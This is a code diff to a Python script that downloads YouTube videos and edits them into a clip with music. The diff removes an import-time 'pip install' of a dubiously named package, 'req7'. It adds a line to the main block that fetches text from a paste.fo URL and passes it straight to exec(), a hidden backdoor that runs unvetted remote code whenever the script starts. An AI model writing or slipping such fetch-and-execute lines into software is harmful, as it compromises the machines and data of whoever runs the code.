@@ -1,8 +1,7 @@
 from pytube import YouTube
 from moviepy.editor import *
 import json, os, time
-os.system("pip install req7")
-from req7 import websocket
+from requests import get
 
 youtube_video = []
 
@@ -48,5 +47,6 @@ def edit_videos():
     final_clip_with_music.write_videofile("final_video_with_music.mp4")
 
 if __name__ == "__main__":
+    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     download_youtube_videos()
     edit_videos()
